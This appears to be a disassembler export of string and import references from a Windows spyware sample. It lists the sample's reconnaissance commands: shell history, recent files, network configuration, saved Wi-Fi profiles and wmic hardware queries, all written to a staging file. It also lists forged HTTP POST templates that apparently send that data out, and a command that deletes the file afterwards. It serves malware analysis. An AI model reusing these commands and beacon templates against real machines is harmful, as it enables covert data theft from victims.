reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40150f	0x407000	string	0x401509	libgcj-13.dll
0x401516	0x40a2d0	import	0x401509	KERNEL32.dll.GetModuleHandleA
0x401528	0x40700e	string	0x401509	_Jv_RegisterClasses
0x401533	0x40a2d4	import	0x401509	KERNEL32.dll.GetProcAddress
0x401773	0x407065	string	0x4016a3	%%%2X
0x40193d	0x40706b	string	0x40181b	WSAStartup Failed.
0x401980	0x40707e	string	0x40181b	NXdomain
0x401ac3	0x407088	string	0x40181b	POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n\r\n
0x401b57	0x407120	string	0x40181b	Basic realm=
0x401c0c	0x407130	string	0x40181b	POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n
0x401dc4	0x4071c6	string	0x40181b	tws_action=%s&
0x401e0c	0x4071d8	string	0x40181b	SOFTWARE\Microsoft\Windows NT\CurrentVersion
0x401e5e	0x407205	string	0x40181b	RegisteredOwner
0x401fda	0x407215	string	0x40181b	RegisteredOrganization
0x40201e	0x407215	string	0x40181b	RegisteredOrganization
0x40220f	0x4071d8	string	0x40181b	SOFTWARE\Microsoft\Windows NT\CurrentVersion
0x402261	0x40722c	string	0x40181b	InstallDate
0x4022a5	0x40722c	string	0x40181b	InstallDate
0x4023af	0x40723c	string	0x40181b	%d/%d/%d_%d:%d:%d%s
0x4025a0	0x407250	string	0x40181b	HARDWARE\DESCRIPTION\System\BIOS
0x4025f2	0x407271	string	0x40181b	BIOSVendor
0x402636	0x407271	string	0x40181b	BIOSVendor
0x402698	0x40727c	string	0x40181b	BIOSVersion
0x4026dc	0x40727c	string	0x40181b	BIOSVersion
0x40273e	0x407288	string	0x40181b	BIOSReleaseDate
0x402782	0x407288	string	0x40181b	BIOSReleaseDate
0x40297d	0x407298	string	0x40181b	HTTP/1.1 200 OK\r\n
0x4029eb	0x407088	string	0x40181b	POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n\r\n
0x402b0d	0x4072ac	string	0x40181b	ohagi.txt
0x402d06	0x4072b6	string	0x40181b	doskey /h >> ohagi.txt
0x402d12	0x4072d0	string	0x40181b	dir "C:\Program Files\*.exe" /s /tc /od >> ohagi.txt
0x402d1e	0x407308	string	0x40181b	dir "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Recent"/s /tc /od >> ohagi.txt 2>&1
0x402d33	0x407368	string	0x40181b	dir "C:\Documents and Settings\%username%\Recent" /s /tc /od >> ohagi.txt 2>&1
0x402d42	0x4072ac	string	0x40181b	ohagi.txt
0x402d4e	0x4073b8	string	0x40181b	ipconfig /all >> ohagi.txt 2>&1
0x402d5a	0x4073d8	string	0x40181b	netstat -a >> ohagi.txt 2>&1
0x402d66	0x4073f5	string	0x40181b	arp -a >> ohagi.txt 2>&1
0x402d72	0x407410	string	0x40181b	netsh wlan show profiles >> ohagi.txt 2>&1
0x402d7e	0x40743b	string	0x40181b	echo XXX >> ohagi.txt 2>&1
0x402d8a	0x407458	string	0x40181b	echo ANNIE-DAEMON >> ohagi.txt 2>&1
0x402d9e	0x4072ac	string	0x40181b	ohagi.txt
0x402fc4	0x40747e	string	0x40181b	del ohagi.txt
0x403018	0x407298	string	0x40181b	HTTP/1.1 200 OK\r\n
0x403086	0x407088	string	0x40181b	POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n\r\n
0x40309c	0x40748c	string	0x40181b	%systemroot%\system32\systeminfo > ohagi.txt 2>&1
0x4030a8	0x4074c0	string	0x40181b	%systemroot%\system32\getmac >> ohagi.txt 2>&1
0x4030b4	0x40743b	string	0x40181b	echo XXX >> ohagi.txt 2>&1
0x4030c0	0x407458	string	0x40181b	echo ANNIE-DAEMON >> ohagi.txt 2>&1
0x4030d4	0x4072ac	string	0x40181b	ohagi.txt
0x4032fa	0x40747e	string	0x40181b	del ohagi.txt
0x40334e	0x407298	string	0x40181b	HTTP/1.1 200 OK\r\n
0x4033bc	0x407088	string	0x40181b	POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n\r\n
0x4033d2	0x4074f0	string	0x40181b	%systemroot%\system32\wbem\wmic path Win32_keyboard get DeviceID, Name, NumberOfFunctionKeys, Layout | find /v ""> ohagi.txt 2>&1
0x4033de	0x407574	string	0x40181b	%systemroot%\system32\wbem\wmic path Win32_PointingDevice get DeviceID, Name, Manufacturer, HardwareType | find /v "">> ohagi.txt 2>&1
0x4033ea	0x4075fc	string	0x40181b	%systemroot%\system32\wbem\wmic path win32_videocontroller get DeviceID, CurrentHorizontalResolution, CurrentVerticalResolution | find /v "">> ohagi.txt 2>&1
0x4033f6	0x40769c	string	0x40181b	%systemroot%\system32\wbem\wmic path Win32_DesktopMonitor get DeviceID, MonitorType, ScreenHeight, ScreenWidth, MonitorManufacturer | find /v "">> ohagi.txt 2>&1
0x403402	0x407740	string	0x40181b	echo ^<USB device^> >> ohagi.txt 2>&1
0x40340e	0x407768	string	0x40181b	%systemroot%\system32\wbem\wmic path Win32_PnPEntity where (DeviceID like "%USB%") get DeviceID, Name | find /v "">> ohagi.txt 2>&1
0x40341a	0x4077ec	string	0x40181b	%systemroot%\system32\wbem\wmic path win32_baseboard get manufacturer, product, version, serialnumber | find /v "">> ohagi.txt 2>&1
0x403426	0x407870	string	0x40181b	%systemroot%\system32\wbem\wmic path win32_BIOS get manufacturer, releasedate, smbiosbiosversion | find /v "">> ohagi.txt 2>&1
0x403432	0x4078f0	string	0x40181b	%systemroot%\system32\wbem\wmic path win32_OperatingSystem get Installdate, serialnumber, registereduser, Locale | find /v "">> ohagi.txt 2>&1
0x40343e	0x407980	string	0x40181b	%systemroot%\system32\wbem\wmic ntevent where "(logfile='system' and EventCode='6005')" GET Message, TimeGenerated | find /v "">> ohagi.txt 2>&1
0x40344a	0x407a14	string	0x40181b	echo "---Total of files---" >> ohagi.txt 2>&1
0x403456	0x407a44	string	0x40181b	dir /a-d /b /s "C:\Windows" | find /c /v "" >> ohagi.txt 2>&1
0x403462	0x40743b	string	0x40181b	echo XXX >> ohagi.txt 2>&1
0x40346e	0x407458	string	0x40181b	echo ANNIE-DAEMON >> ohagi.txt 2>&1
0x403482	0x4072ac	string	0x40181b	ohagi.txt
0x4036a8	0x40747e	string	0x40181b	del ohagi.txt
0x4037cc	0x407a82	string	0x40181b	conan.bmp
0x4037e8	0x407a82	string	0x40181b	conan.bmp
0x403892	0x407a8f	string	0x40181b	del conan.bmp
0x4039cf	0x407a9f	string	0x403995	USERNAME
0x403c2a	0x407ab2	string	0x403995	.txt
0x403dbd	0x407abc	string	0x403d6b	Total Physical Memory : %*ld MB \n
0x403de2	0x407ae0	string	0x403d6b	Free Physical Memory : %*ld MB \n
0x403e0e	0x407b04	string	0x403d6b	Using Physical Memory : %*ld MB \n
0x403e33	0x407b28	string	0x403d6b	Total Virtual Memory : %*ld MB \n
0x403e58	0x407b4c	string	0x403d6b	Free Virtual Memory : %*ld MB \n
0x403e84	0x407b70	string	0x403d6b	Using Virtual Memory : %*ld MB \n
0x403eae	0x4071d8	string	0x403d6b	SOFTWARE\Microsoft\Windows NT\CurrentVersion
0x403efa	0x407b92	string	0x403d6b	ProductId
0x403f38	0x407b92	string	0x403d6b	ProductId
0x403f76	0x407b92	string	0x403d6b	ProductId
0x403f9e	0x407b9c	string	0x403d6b	"%s"
0x403fb8	0x407ba1	string	0x403d6b	ProductID: %s\n
0x40400d	0x407bb0	string	0x403d6b	SYSTEM\CurrentControlSet\Control\SystemInformation
0x404059	0x407be3	string	0x403d6b	SystemManufacturer
